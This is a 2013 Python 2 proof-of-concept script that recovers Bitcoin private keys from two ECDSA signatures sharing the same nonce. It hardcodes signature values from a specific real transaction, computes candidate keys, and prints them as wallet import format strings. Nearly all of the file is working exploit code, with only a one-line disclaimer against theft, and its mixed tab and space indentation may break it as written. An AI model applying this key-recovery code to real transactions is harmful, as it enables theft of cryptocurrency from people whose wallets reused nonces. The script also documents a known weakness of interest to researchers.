#!/usr/bin/env python
#
# Proof of concept of bitcoin private key recovery using weak ECDSA signatures
# 
# Based on http://www.nilsschneider.net/2013/01/28/recovering-bitcoin-private-keys.html
# Regarding Bitcoin Tx https://blockchain.info/tx/9ec4bc49e828d924af1d1029cacf709431abbde46d59554b62bc270e3b29c4b1.
# As it's said in the previous article you need to poke around into the OP_CHECKSIG function in order to get z1 and z2,
# in other hand for every other parameters you should be able to get them from the Tx itself.
#
# Author Dario Clavijo <daedalus2027@gmail.com> , Jan 2013
# Donations: 1LgWNdNTnzeNgNMzWHtPtXPjxcutJKu74r
#
# This code is licensed under the terms of the GPLv3 license http://gplv3.fsf.org/
#
# Disclaimer: Do not steal other peoples money, that's bad.


import hashlib

p  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
#r  = 0xd47ce4c025c35ec440bc81d99834a624875161a26bf56ef7fdc0f5d52f843ad1
#s1 = 0x44e1ff2dfd8102cf7a47c21d5c9fd5701610d04953c6836596b4fe9dd2f53e3e
#s2 = 0x9a5f1c75e461d7ceb1cf3cab9013eb2dc85b6d0da8c3c6e27e3a5a5b3faa5bab
z1 = 0xc0e2d0a89a348de88fda08211c70d1d7e52ccef2eb9459911bf977d587784c6e 
z2 = 0x17b0f41c8c337ac1e18c98759e83a8cccbc368dd9d89e5f03cb633c265fd0ddc

# r1 and s1 are contained in this ECDSA signature encoded in DER (openssl default).
der_sig1 = "30440220d47ce4c025c35ec440bc81d99834a624875161a26bf56ef7fdc0f5d52f843ad1022044e1ff2dfd8102cf7a47c21d5c9fd5701610d04953c6836596b4fe9dd2f53e3e01"

# the same thing with the above line.
der_sig2 = "30440220d47ce4c025c35ec440bc81d99834a624875161a26bf56ef7fdc0f5d52f843ad102209a5f1c75e461d7ceb1cf3cab9013eb2dc85b6d0da8c3c6e27e3a5a5b3faa5bab01"

params = {'p':p,'sig1':der_sig1,'sig2':der_sig2,'z1':z1,'z2':z2}

def hexify (s, flip=False):
    if flip:
        return s[::-1].encode ('hex')
    else:
        return s.encode ('hex')

def unhexify (s, flip=False):
    if flip:
        return s.decode ('hex')[::-1]
    else:
        return s.decode ('hex')

def inttohexstr(i):
	tmpstr = "%s" % hex(i)
	hexstr = tmpstr.replace('0x','').replace('L','')
	return hexstr

b58_digits = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'

def dhash(s):
    return hashlib.sha256(hashlib.sha256(s).digest()).digest()

def rhash(s):
    h1 = hashlib.new('ripemd160')
    h1.update(hashlib.sha256(s).digest())
    return h1.digest()

def base58_encode(n):
    l = []
    while n > 0:
        n, r = divmod(n, 58)
        l.insert(0,(b58_digits[r]))
    return ''.join(l)

def base58_encode_padded(s):
    res = base58_encode(int('0x' + s.encode('hex'), 16))
    pad = 0
    for c in s:
        if c == chr(0):
            pad += 1
        else:
            break
    return b58_digits[0] * pad + res

def base58_check_encode(s, version=0):
    vs = chr(version) + s
    check = dhash(vs)[:4]
    return base58_encode_padded(vs + check)
	
def get_der_field(i,binary):
        if (ord(binary[i]) == 02):
                length = binary[i+1]
                end = i + ord(length) + 2
                string = binary[i+2:end]
                return string
        else:
                return None

# Here we decode a DER encoded string separating r and s
def der_decode(hexstring):
        binary = unhexify(hexstring)
        full_length = ord(binary[1])
        if ((full_length + 3) == len(binary)):
                r = get_der_field(2,binary)
                s = get_der_field(len(r)+4,binary)
                return r,s
        else:
                return None

def show_results(privkeys):
		print "Posible Candidates..."
	for privkey in privkeys:
        	hexprivkey = inttohexstr(privkey)
		print "intPrivkey = %d"  % privkey
		print "hexPrivkey = %s" % hexprivkey
		print "bitcoin Privkey (WIF) = %s" % base58_check_encode(hexprivkey.decode('hex'),version=128)

def show_params(params):
	for param in params:
		try:
			print "%s: %s" % (param,inttohexstr(params[param]))
		except:
			print "%s: %s" % (param,params[param])

# This is the same as (a/b mod p) but avoiding floating numbers since we are dealing with prime numbers and modulus
# and beacuse this the python built in division isn't suitable for our needs, 
# it returns floating point numbers rounded and we don't want them.
def inverse_mult(a,b,p):
	y =  (a * pow(b,p-2,p))  #(pow(a, b) modulo p) where p should be a prime number
	return y

# Here is the wrock!
def derivate_privkey(p,r,s1,s2,z1,z2):
	
	privkey = []
	
	privkey.append((inverse_mult(((z1*s2) - (z2*s1)),(r*(s1-s2)),p) % int(p)))
	privkey.append((inverse_mult(((z1*s2) - (z2*s1)),(r*(s1+s2)),p) % int(p)))
	privkey.append((inverse_mult(((z1*s2) - (z2*s1)),(r*(-s1-s2)),p) % int(p)))
	privkey.append((inverse_mult(((z1*s2) - (z2*s1)),(r*(-s1+s2)),p) % int(p)))
	
	return privkey

def process_signatures(params):
	
	p = params['p']
	sig1 = params['sig1']
	sig2 = params['sig2']
	z1 = params['z1']
	z2 = params['z2']
	
	tmp_r1,tmp_s1 = der_decode(sig1) # Here we extract r and s from the signature encoded in DER.
	tmp_r2,tmp_s2 = der_decode(sig2) # Idem.

	if (tmp_r1 == tmp_r2): # If r1 and r2 are equal the two signatures are weak and we can recover the private key.

 		if (tmp_s1 != tmp_s2): # This: (s1-s2)>0 should be complied in order be able to compute the private key.
		
			# the key of ECDSA are the integer numbers thats why we convert hexa from to them.
			r1 = int(tmp_r1.encode('hex'),16)
			r2 = int(tmp_r2.encode('hex'),16)
			s1 = int(tmp_s1.encode('hex'),16)
			s2 = int(tmp_s2.encode('hex'),16)
	
			privkey = derivate_privkey(p,r1,s1,s2,z1,z2)
			return privkey		

		else:
			raise Exception("Privkey not computable: s1 and s2 are equal.")
	else:
		raise Exception("Privkey not computable: r1 and r2 are not equal.")

def main():
	show_params(params)
	privkey = process_signatures(params)
	if len(privkey)>0:		
		show_results(privkey)

if __name__ == "__main__":
    main()
